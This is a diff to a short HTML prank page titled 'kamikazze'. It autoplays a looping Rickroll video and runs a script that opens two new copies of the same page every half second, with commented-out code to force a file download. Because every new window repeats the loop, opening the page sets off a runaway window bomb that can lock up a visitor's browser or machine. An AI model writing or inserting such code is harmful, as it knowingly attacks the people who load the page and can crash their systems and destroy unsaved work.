@@ -4,13 +4,26 @@
         <title>kamikazze</title>
     </head>
     <body>
-        <iframe width="560" height="315" src="https://www.youtube.com/embed/xvFZjo5PgG0?si=7xseAgWGmGD4IhM_&amp;controls=0" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+        <video width="100%" height="60%" autoplay="autoplay" loop="true" muted>
+            <source src="RickRoll.mp4" type="video/mp4">  
+        </video>
+        
         <script>
             var src = 'index.html';
             setInterval(function() {
                 window.open(src);
-            }, 500);
-            
+                window.open(src);
+            }, 500); 
+            /*setInterval(function() {
+                
+            }, 500);*/
+            /*const url = 'index.html';
+            const link = document.createElement('a');
+            link.href = url;
+            link.setAttribute('download', 'RickRoll.mp4'); // Optional: Set a custom file name
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);*/
         </script>
     </body>
 </html>
